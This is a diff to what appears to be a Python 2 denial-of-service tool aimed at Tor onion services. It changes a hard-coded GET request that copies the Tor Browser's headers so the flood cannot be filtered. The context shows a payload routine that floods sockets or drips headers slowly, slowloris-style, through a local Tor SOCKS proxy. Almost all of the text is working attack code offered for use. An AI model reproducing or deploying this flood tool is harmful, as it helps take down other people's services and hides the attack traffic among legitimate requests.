@@ -22,6 +22,9 @@ args = parser.parse_args()
 if not args.s.lower().endswith(".onion"): #Only onion addresses accepted.
     print "Error: server specified is not hosted under Tor."
     exit(1)
+elif not len(list(args.s.lower())) >= 22:
+    print "Error: server specified is not hosted under Tor."
+    exit(1)
     
 try:
     socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", int(args.tp))
@@ -29,14 +32,14 @@ except e as Exception:
     print "Error: Tor port is not an integer."
     exit(1)
     
-exploit = ("GET / HTTP/1.1\r\n"
-           "Host: %s\r\n"
-           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-           "Accept-Encoding: gzip, deflate, br\r\n"
-           "Accept-Language: en-US,en;q=0.5\r\n"
-           "Connection: keep-alive\r\n"
-           "Upgrade-Insecure-Requests: 1\r\n"
-           "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
+exploit = (	"GET /test HTTP/1.1\r\n"
+		"Host: %s\r\n"
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+		"Accept-Encoding: gzip, deflate, br\r\n"
+		"Accept-Language: en-US,en;q=0.5\r\n"
+		"Connection: keep-alive\r\n"
+		"Upgrade-Insecure-Requests: 1\r\n"
+		"User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0\r\n\r\n"
            % (args.s)) #Exact replica of the HTTP request sent by the Tor Browser Bundle, filtering this request will be DoS in itself.
 
 def payload(s, exploit): #floods the open socket with GET requests till it closes (if ever), or opens as many sockets as possible and slowly sends the HTTP headers.
